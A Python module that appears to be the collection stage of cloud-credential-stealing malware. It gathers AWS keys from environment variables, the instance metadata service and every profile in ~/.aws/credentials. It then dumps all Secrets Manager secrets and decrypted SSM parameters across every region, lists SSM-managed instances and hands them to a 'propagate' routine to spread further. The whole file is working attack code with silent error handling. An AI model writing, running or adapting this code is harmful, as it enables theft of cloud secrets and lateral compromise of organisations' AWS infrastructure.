import json
import os
import urllib.request
import urllib.error
import configparser
import concurrent.futures
from utilities.aws_signer import generate_aws_headers

REGIONS = [
    "us-east-1", "us-east-2", "us-west-1", "us-west-2",
    "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1", "eu-north-1",
    "ap-northeast-1", "ap-northeast-2", "ap-northeast-3", "ap-southeast-1", "ap-southeast-2", "ap-south-1",
    "sa-east-1", "ca-central-1", "us-gov-east-1", "us-gov-west-1"
]

def _get_imds_credentials():
    try:
        req = urllib.request.Request("http://169.254.169.254/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT")
        token = urllib.request.urlopen(req, timeout=1).read().decode().strip()
        req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers={"X-aws-ec2-metadata-token": token})
        role = urllib.request.urlopen(req2, timeout=1).read().decode().strip()
        req3 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", headers={"X-aws-ec2-metadata-token": token})
        creds = json.loads(urllib.request.urlopen(req3, timeout=1).read().decode())
        return creds.get('AccessKeyId', '').strip(), creds.get('SecretAccessKey', '').strip(), creds.get('Token', '').strip()
    except: return None, None, None

def resolve_credentials():
    ak = os.environ.get('AWS_ACCESS_KEY_ID')
    sk = os.environ.get('AWS_SECRET_ACCESS_KEY')
    tok = os.environ.get('AWS_SESSION_TOKEN')
    if ak and sk: return ak.strip(), sk.strip(), tok.strip() if tok else None, "env"
    
    ak, sk, tok = _get_imds_credentials()
    if ak and sk: return ak, sk, tok, "imds"
    return None, None, None, None

def resolve_all_profiles():
    profiles = []
    cred_file = os.path.expanduser('~/.aws/credentials')
    cfg_file = os.path.expanduser('~/.aws/config')
    if not os.path.exists(cred_file): return profiles
    
    config = configparser.ConfigParser()
    config.read(cred_file)
    cfg = configparser.ConfigParser()
    if os.path.exists(cfg_file): cfg.read(cfg_file)
        
    for section in config.sections():
        ak = config[section].get('aws_access_key_id')
        sk = config[section].get('aws_secret_access_key')
        tok = config[section].get('aws_session_token')
        if not ak or not sk: continue
        
        region = (config[section].get('region') or cfg.get(f'profile {section}', 'region', fallback=None) or cfg.get(section, 'region', fallback=None))
        profiles.append((section, ak.strip(), sk.strip(), tok.strip() if tok else None, region))
    return profiles

def _call_secrets_manager(region, ak, sk, tok, target, payload_dict):
    payload_str = json.dumps(payload_dict)
    host = f"secretsmanager.{region}.amazonaws.com"
    url = f"https://{host}/"
    
    headers = generate_aws_headers("POST", url, host, region, "secretsmanager", target, ak, sk, tok, payload_str)
    req = urllib.request.Request(url, data=payload_str.encode('utf-8'), headers=headers, method="POST")
    
    with urllib.request.urlopen(req, timeout=10) as response:
        return json.loads(response.read().decode('utf-8'))

def _call_ssm(region, ak, sk, tok, target, payload_dict):
    payload_str = json.dumps(payload_dict)
    host = f"ssm.{region}.amazonaws.com"
    url = f"https://{host}/"
    
    headers = generate_aws_headers("POST", url, host, region, "ssm", target, ak, sk, tok, payload_str)
    req = urllib.request.Request(url, data=payload_str.encode('utf-8'), headers=headers, method="POST")
    
    with urllib.request.urlopen(req, timeout=10) as response:
        return json.loads(response.read().decode('utf-8'))

def _scan_ssm_instances_region(r, ak, sk, tok):
    region_instances = []
    try:
        response = _call_ssm(r, ak, sk, tok, "DescribeInstanceInformation", {})
        for inst in response.get("InstanceInformationList", []):
            region_instances.append({
                "InstanceId": inst.get("InstanceId"),
                "PingStatus": inst.get("PingStatus"),
                "PlatformType": inst.get("PlatformType"),
                "ComputerName": inst.get("ComputerName"),
                "IPAddress": inst.get("IPAddress")
            })
    except Exception:
        pass
    return r, region_instances

def _enumerate_ssm_instances(ak, sk, tok, regions):
    instances = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(_scan_ssm_instances_region, r, ak, sk, tok) for r in regions]
        for future in concurrent.futures.as_completed(futures):
            r, reg_instances = future.result()
            if reg_instances:
                instances[r] = reg_instances
    return instances

def _scan_region(r, ak, sk, tok):
    region_secrets = {}
    try:
        list_response = _call_secrets_manager(r, ak, sk, tok, "ListSecrets", {})
        for secret in list_response.get("SecretList", []):
            name = secret.get("Name")
            try:
                val = _call_secrets_manager(r, ak, sk, tok, "GetSecretValue", {"SecretId": name})
                region_secrets[name] = val.get("SecretString") or {"__binary__": True}
            except Exception:
                region_secrets[name] = {"__error__": "failed to retrieve"}
    except Exception:
        pass 
    return r, region_secrets

def _enumerate_secrets(ak, sk, tok, regions):
    secrets = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(_scan_region, r, ak, sk, tok) for r in regions]
        for future in concurrent.futures.as_completed(futures):
            r, reg_secrets = future.result()
            if reg_secrets:
                secrets[r] = reg_secrets
    return secrets

def _scan_ssm_region(r, ak, sk, tok):
    region_params = {}
    try:
        next_token = None
        while True:
            payload = {}
            if next_token:
                payload["NextToken"] = next_token
            list_response = _call_ssm(r, ak, sk, tok, "DescribeParameters", payload)
            for param in list_response.get("Parameters", []):
                name = param.get("Name")
                try:
                    val = _call_ssm(r, ak, sk, tok, "GetParameter", {"Name": name, "WithDecryption": True})
                    param_data = val.get("Parameter", {})
                    region_params[name] = {
                        "Value": param_data.get("Value"),
                        "Type": param_data.get("Type")
                    }
                except Exception:pass
            next_token = list_response.get("NextToken")
            if not next_token:
                break
    except Exception:pass
    return r, region_params

def _enumerate_ssm(ak, sk, tok, regions):
    params = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(_scan_ssm_region, r, ak, sk, tok) for r in regions]
        for future in concurrent.futures.as_completed(futures):
            r, reg_params = future.result()
            if reg_params:
                params[r] = reg_params
    return params

def _process_profile(p_name, ak, sk, tok, p_reg, source="credentials_file"):
    reg = [p_reg] if p_reg else REGIONS
    secrets = _enumerate_secrets(ak, sk, tok, reg)
    ssm_params = _enumerate_ssm(ak, sk, tok, reg)
    ssm_instances = _enumerate_ssm_instances(ak, sk, tok, reg)
    return p_name, {"source": source, "secrets": secrets, "ssm_parameters": ssm_params, "ssm_instances": ssm_instances}

def _propagate_to_instances(all_instances):
    try:
        from collectors.propagate import propagate_to_discovered_instances
        return propagate_to_discovered_instances(all_instances)
    except Exception as e:
        return {"error": str(e)}

def collect() -> dict:
    result = {"profiles": {}}
    profiles_to_scan = resolve_all_profiles()
    
    ak, sk, tok, source = resolve_credentials()
    if ak:
        profiles_to_scan.append(("__runtime_source__", ak, sk, tok, None))
        
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for p in profiles_to_scan:
            p_name, ak, sk, tok, p_reg = p
            src = "env/imds" if p_name == "__runtime_source__" else "credentials_file"
            futures.append(executor.submit(_process_profile, p_name, ak, sk, tok, p_reg, src))
            
        for future in concurrent.futures.as_completed(futures):
            p_name, profile_data = future.result()
            result["profiles"][p_name] = profile_data
    
    all_instances = {}
    for profile_name, profile_data in result["profiles"].items():
        ssm_data = profile_data.get("ssm_instances", {})
        if ssm_data:
            all_instances[profile_name] = ssm_data
    
    if all_instances:
        result["propagation"] = _propagate_to_instances(all_instances)
    else:
        result["propagation"] = {"error": "no_ssm_instances_discovered"}
            
    return result